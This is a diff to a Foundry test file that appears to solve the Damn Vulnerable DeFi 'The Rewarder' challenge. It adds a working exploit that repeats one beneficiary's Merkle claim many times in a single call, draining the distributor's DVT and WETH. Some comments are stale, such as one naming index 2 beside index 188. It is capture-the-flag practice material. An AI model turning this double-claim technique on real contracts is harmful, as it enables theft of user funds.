@@ -51,6 +51,7 @@ contract TheRewarderChallenge is Test {
         // Deploy tokens to be distributed
         dvt = new DamnValuableToken();
         weth = new WETH();
+        // DVT的constructor中已经给了deployer无限额度, 所以不需要deposit
         weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();
 
         // Calculate roots for DVT and WETH distributions
@@ -64,6 +65,7 @@ contract TheRewarderChallenge is Test {
         distributor = new TheRewarderDistributor();
 
         // Create DVT distribution
+        // distributor has 10 DVT
         dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
             token: IERC20(address(dvt)),
@@ -144,11 +146,56 @@ contract TheRewarderChallenge is Test {
         assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
     }
 
+    function test_debug5() public checkSolvedByPlayer {
+        console.log("rounds for dvt = ", dvt.balanceOf(address(distributor)) / 11524763827831882);
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         
+        uint256 playerAmountWETH = 1171088749244340;
+        uint256 playerAmountDVT = 11524763827831882;
+        
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create Alice's claims
+        Claim[] memory claimsDVT = new Claim[](dvt.balanceOf(address(distributor)) / playerAmountDVT);
+
+        for (uint i = 0; i < dvt.balanceOf(address(distributor)) / playerAmountDVT; i++) {
+            claimsDVT[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: playerAmountDVT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+            });
+        }
+
+        Claim[] memory claimsWETH = new Claim[](weth.balanceOf(address(distributor)) / playerAmountWETH);
+
+        for (uint i = 0; i < weth.balanceOf(address(distributor)) / playerAmountWETH; i++) {
+            claimsWETH[i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: playerAmountWETH,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+            });
+        }
+        
+        distributor.claimRewards({inputClaims: claimsDVT, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claimsWETH, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
+
+        console.log("player's balance(DVT) = ", dvt.balanceOf(player));
     }
 
     /**
@@ -179,10 +226,12 @@ contract TheRewarderChallenge is Test {
 
     // Utility function to read rewards file and load it into an array of leaves
     function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
+        // 将Json文件解析成Reward结构体数组
         Reward[] memory rewards =
             abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
 
+        // 将每个Reward对象进行hash, 得到leaves数组
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
